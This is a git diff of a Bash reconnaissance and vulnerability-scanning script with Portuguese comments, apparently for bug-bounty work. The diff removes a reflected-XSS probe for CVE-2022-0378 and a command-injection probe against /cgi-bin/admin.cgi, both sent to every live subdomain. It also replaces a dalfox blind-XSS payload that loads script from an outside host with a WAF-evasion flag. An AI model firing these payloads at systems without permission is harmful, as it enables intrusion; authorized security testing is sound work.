@@ -283,17 +283,6 @@ cat "$folder/EndpointsL.txt" | uro | gf ssrf | anew "$folder/ssrf.txt"
 
 echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"
 
-# One-line test
-# One-line CVE-2022-0378
-echo -e "\e[32mCVE-2022-0378 One-line\e[0m"
-cat "$folder/live_subdomains.txt" | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"| grep -qs "onmouse" && echo "$h: VULNERABLE - URL: $h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"; done > "$folder/CVE-2022-0378.txt"
-echo -e "\e[1;31m$(wc -l < "$folder/CVE-2022-0378.txt")\e[0m"
-
-# One-line Rce
-echo -e "\e[32mRCE One-line\e[0m"
-cat "$folder/live_subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
-echo -e "\e[1;31m$(wc -l < "$folder/RceOneline.txt")\e[0m"
-
 # takeover vulnerabilities
 # criar caminho e add o arquivo abaixo
 #https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json
@@ -314,7 +303,7 @@ echo -e "\e[1;31m$(wc -l < "$folder/crlfVul.txt")\e[0m"
 
 # dalfox
 echo -e "\e[32mExecutando dalfox Vulnerabilit\e[0m"
-dalfox file "$folder/XSS_Ref.txt" --skip-mining-all -b '<script src=https://mrxbugcom.bxss.in></script>' -o "$folder/Vulnerable_XSS.txt"
+dalfox file "$folder/XSS_Ref.txt" --skip-mining-all --waf-evasion -o "$folder/Vulnerable_XSS.txt"
 
 # nuclei exposures JS
 echo -e "\e[32mExecutando nuclei JS Vulnerabilit\e[0m"
